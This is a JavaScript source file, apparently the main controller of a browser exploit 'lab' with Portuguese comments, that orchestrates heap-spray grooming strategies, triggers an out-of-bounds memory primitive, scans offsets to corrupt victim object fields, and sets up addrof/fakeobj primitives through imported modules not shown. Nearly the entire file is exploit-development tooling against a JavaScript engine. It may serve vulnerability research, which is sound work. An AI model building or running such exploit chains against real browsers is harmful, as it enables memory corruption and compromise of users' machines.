// js/app.mjs
import { log, PAUSE_LAB } from './utils.mjs';
import * as Int64 from './int64.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
import * as Corruptor from './victim_corruptor.mjs';
import * as PostExploit from './post_exploit_conceptual.mjs';
import { updateOOBConfigFromUI as updateGlobalOOBConfig} from './config.mjs';

// Namespace para funções de UI e orquestração principal
const App = {
    runAllGroomingStrategies: async () => {
        const FNAME_STRAT = "App.runAllGroomingStrategies";
        log(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
        updateGlobalOOBConfig(); // Atualiza configs globais como OOB_CONFIG.ALLOCATION_SIZE
        const spray_count_el = document.getElementById('sprayCountBase');
        const intermediate_allocs_el = document.getElementById('intermediateAllocs');

        const spray_count = spray_count_el ? parseInt(spray_count_el.value) || 500 : 500;
        const intermediate_allocs = intermediate_allocs_el ? parseInt(intermediate_allocs_el.value) || 100 : 100;

        const strategies = [
            { victim_first: true, oob_first: false, spray_adj: 0, inter_adj: 0, name: "Vítima primeiro, OOB depois (Padrão)"},
            { victim_first: false, oob_first: true, spray_adj: 0, inter_adj: 0, name: "OOB primeiro, Vítima depois"},
            { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
            { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
        ];
        Corruptor.last_successful_gap = null; // Resetar antes de novas estratégias

        for (const strat of strategies) {
            if (Corruptor.last_successful_gap !== null) { log("GAP de sucesso já encontrado. Interrompendo.", "good", FNAME_STRAT); break; }
            log(`*** Iniciando Estratégia: ${strat.name} ***`, "critical", FNAME_STRAT);
            if (strat.oob_first) {
                await Core.triggerOOB_primitive();
                if (!Core.oob_dataview_real) { log("Falha OOB, pulando.", "error", FNAME_STRAT); continue; }
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, Core.getOOBAllocationSize(), intermediate_allocs + strat.inter_adj, false);
                if (!await Groomer.prepareVictim(Core.getOOBAllocationSize())) continue;
            } else {
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, Core.getOOBAllocationSize(), intermediate_allocs + strat.inter_adj, true);
                if (!await Groomer.prepareVictim(Core.getOOBAllocationSize())) continue;
                await Core.triggerOOB_primitive();
                if (!Core.oob_dataview_real) { log("Falha OOB, pulando.", "error", FNAME_STRAT); continue; }
            }
            await Corruptor.findAndCorruptVictimFields_Iterative();
            await PAUSE_LAB(2000);
        }
        log(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
        if (Corruptor.last_successful_gap === null) { log("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
         else {
            const addrofGapEl = document.getElementById('addrofGap');
            if (addrofGapEl) addrofGapEl.value = Corruptor.last_successful_gap;
         }
    },

    updateCurrentTestGapFromScanUIAndTestSingle: () => {
        const gapStartScanEl = document.getElementById('gapStartScan');
        const gapVal = gapStartScanEl ? parseInt(gapStartScanEl.value) : NaN;

        if (!isNaN(gapVal)) {
            Corruptor.CURRENT_TEST_GAP = gapVal;
            log(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.CURRENT_TEST_GAP} bytes.`, 'tool', 'App.Config');
            Corruptor.try_corrupt_fields_for_gap(Corruptor.CURRENT_TEST_GAP);
        } else { log("Valor de GAP inválido.", "error", "App.Config"); }
    },

    setupUIEventListeners: () => {
        // Botões de Teste de Módulo
        const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
        if (moduleTestButtonsContainer) {
            moduleTestButtonsContainer.innerHTML += `<button id="btnTestInt64">Testar Módulo Int64</button>`;
            moduleTestButtonsContainer.innerHTML += `<button id="btnTestUtils">Testar Módulo Utils</button>`;
            moduleTestButtonsContainer.innerHTML += `<button id="btnTestCoreExploit">Testar Módulo CoreExploit (OOB)</button>`;
            moduleTestButtonsContainer.innerHTML += `<p class="notes">Módulos HeapGroomer e VictimCorruptor são testados através dos fluxos principais (Passos 1-2). PostExploit é conceitual.</p>`;

            document.getElementById('btnTestInt64')?.addEventListener('click', Int64.testModule);
            document.getElementById('btnTestUtils')?.addEventListener('click', () => import('./utils.mjs').then(utils => utils.testModule())); // Import dinâmico para utils.testModule
            document.getElementById('btnTestCoreExploit')?.addEventListener('click', Core.testModule);
        }

        // Botões Principais
        document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);
        document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
        document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
        document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', Corruptor.findAndCorruptVictimFields_Iterative);
        document.getElementById('btnTestKnownGap')?.addEventListener('click', Corruptor.testCorruptKnownGap);
        document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
        document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
        document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);

        // Listener para inputs de configuração global
        document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);

    },

    initialize: () => {
        updateGlobalOOBConfig(); // Carrega configs da UI no início
        App.setupUIEventListeners();
        log("Laboratório Modularizado (v2.8.0) pronto para testes.", "good", "App.Init");

        const addrofGapEl = document.getElementById('addrofGap');
        if (addrofGapEl && Corruptor.last_successful_gap !== null) {
             addrofGapEl.value = Corruptor.last_successful_gap;
        }
    }
};

// Inicializar a aplicação quando o DOM estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', App.initialize);
} else {
    App.initialize(); // Já carregado
}

log("app.mjs carregado e pronto.", "info", "Global");
